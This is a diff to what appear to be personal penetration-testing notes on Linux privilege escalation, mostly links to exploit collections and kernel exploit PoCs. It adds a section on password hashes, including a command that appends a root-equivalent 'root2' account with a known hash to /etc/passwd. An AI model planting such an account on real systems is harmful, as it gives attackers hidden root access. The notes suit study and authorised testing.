@@ -100,6 +100,7 @@ done
 # priviledge escalation
 
 - https://gtfobins.github.io
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 - https://book.hacktricks.xyz/linux-unix/privilege-escalation
 - http://www.fuzzysecurity.com/tutorials/16.html
 - https://guif.re/windowseop
@@ -140,6 +141,44 @@ find / -uid 1001 -type f 2>/dev/null
 # suid
 find / -perm -u=s -type f 2>/dev/null
 ```
+
+### crypt
+
+- `/etc/shadow`:
+    - hash algorithm `$1` = MD5
+- `/etc/passwd`:
+    - password field
+        - empty: `user1::.....`
+        - disabled: `user1:*:.....`
+        - in `/etc/shadow`: `user1:x:.....`
+    ```bash
+    # Given pass `foo` encrypted as `aaKNIEDOaueR6`
+    perl -le 'print crypt("foo", "aa")'
+    # || Encrypt with random salt
+    openssl passwd foo
+
+    echo "root2:aaKNIEDOaueR6:0:0:root:/root:/bin/bash" >> /etc/passwd
+    ```
+
+- https://en.wikipedia.org/wiki/Crypt_(C)#Key_derivation_functions_supported_by_crypt
+- https://man7.org/linux/man-pages/man3/crypt.3.html
+- https://man7.org/linux/man-pages/man5/passwd.5.html
+    - https://man7.org/linux/man-pages/man8/pwconv.8.html
+
+### pocs
+
+- ~/code/src/pocs/dirtycow/dirty.c
+    - ~/code/src/pocs/cowroot.c
+- [Linux Kernel 2\.4\.x/2\.6\.x \(CentOS 4\.8/5\.3 / RHEL 4\.8/5\.3 / SuSE 10 SP2/11 / Ubuntu 8\.10\) \(PPC\) \- &\#039;sock\_sendpage\(\)&\#039; Local Privilege Escalation \- Linux local Exploit](https://www.exploit-db.com/exploits/9545)
+- [Linux Kernel 2\.6 &lt; 2\.6\.19 \(White Box 4 / CentOS 4\.4/4\.5 / Fedora Core 4/5/6 x86\) \- &\#039;ip\_append\_data\(\)&\#039; Ring0 Privilege Escalation \(1\) \- Linux\_x86 local Exploit](https://www.exploit-db.com/exploits/9542)
+
+- https://appdome.github.io/2017/11/23/towelroot.html
+- https://github.com/SecWiki/linux-kernel-exploits/tree/master/2014/CVE-2014-3153
+- https://github.com/ShotokanZH/Pa-th-zuzu
+
+- https://github.com/lucyoa/kernel-exploits
+- https://github.com/SecWiki/linux-kernel-exploits
+- https://github.com/SecWiki/windows-kernel-exploits
 
 # remote code execution (RCE)
 
